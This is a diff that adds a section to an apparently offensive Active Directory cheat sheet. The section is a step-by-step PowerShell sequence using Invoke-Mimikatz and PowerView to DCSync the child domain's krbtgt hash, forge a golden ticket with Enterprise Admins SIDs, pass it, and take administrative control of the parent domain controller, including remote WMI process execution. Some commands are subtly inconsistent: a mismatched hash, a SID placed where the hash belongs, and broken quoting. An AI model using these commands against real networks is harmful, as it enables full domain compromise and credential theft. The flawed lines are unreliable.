@@ -62,3 +62,46 @@ Input:
 
     PS> invoke-kerberoast -OutputFormat John | Select-Object -ExpandProperty hash
     
+## Powershell Mimikatz - Create Golden Ticket on a Parent Domain with a Bi-Directional Trust
+
+[Powersploit] (https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1)
+
+ #create golden ticket to use  
+  
+    PS> Import-Module .\Invoke-Mimikatz.ps1 PS> Import-Module .\PowerView.ps1 
+    PS> Get-DomainSid  
+    PS> Get-NetGroup “Enterprise Admins" -Domain <Domain> <SID> 
+    
+
+#Grab the NTLM hash of the krbtgt user for the child domain 
+    
+    PS> Invoke-Mimikatz -Command '"lsadump::dcsync /domain:<Domain> /user:krbtgt"' f320b90fa9c53969efc61146e77022b5
+    
+
+#Try mounting the C$ of the parent domain controller
+    
+    PS> dir \<Domain Controller>\c$ #Error - access denied
+    
+
+#Create a golden ticket for a user on the child domain with enterprise admin rights of the parent domain
+   
+    PS> Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<Domain> /sid:<SID> /krbtgt:<SID> /sids:<SID> /ptt"'
+    
+
+#Check administrative access to the parent domain controller
+    
+    PS> dir \\<Domain Controller>l\c$ #Allowed
+    PS> Invoke-WmiMethod -Path Win32_process -Name create -ComputerName <Computer Name> -ArgumentList calc.exe
+    
+
+#Run dcsync with mimikatz
+    
+    PS> Invoke-Mimikatz -Command '"lsadump::dcsync /user:<username> /domain:<domain>"'
+    
+
+#Create a golden ticket file if needed for backup
+    
+    PS> Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<Domain> /sid:<sid> 
+        /krbtgt:f320b90fa9c53963efc61146e77022b5 /sids:<SID>"‘
+
+    PS> Invoke-Mimikatz -Command '"kerberos::ptt ticketname.bin"'
